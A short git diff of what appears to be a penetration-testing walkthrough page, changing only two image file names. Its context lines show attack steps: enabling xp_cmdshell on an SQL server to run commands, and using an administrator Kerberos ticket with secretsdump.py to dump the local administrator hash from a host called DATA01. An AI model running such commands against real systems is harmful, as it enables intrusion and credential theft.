@@ -284,7 +284,7 @@ EXEC sp_configure 'xp_cmdshell',1
 RECONFIGURE
 ```
 
-![](<../../../.gitbook/assets/image (10) (1).png>)
+![](<../../../.gitbook/assets/image (10) (1) (3).png>)
 
 Now we can try to execute the `whoami` command again and it worked:
 
@@ -760,7 +760,7 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass data01.secure.local
 ```
 
-![](<../../../.gitbook/assets/image (1) (1) (2).png>)
+![](<../../../.gitbook/assets/image (1) (1) (2) (1).png>)
 
 16\. We retrieved the hash of the local administrator user. We can use the local admin hash though to authenticate to `DATA01`.&#x20;
 
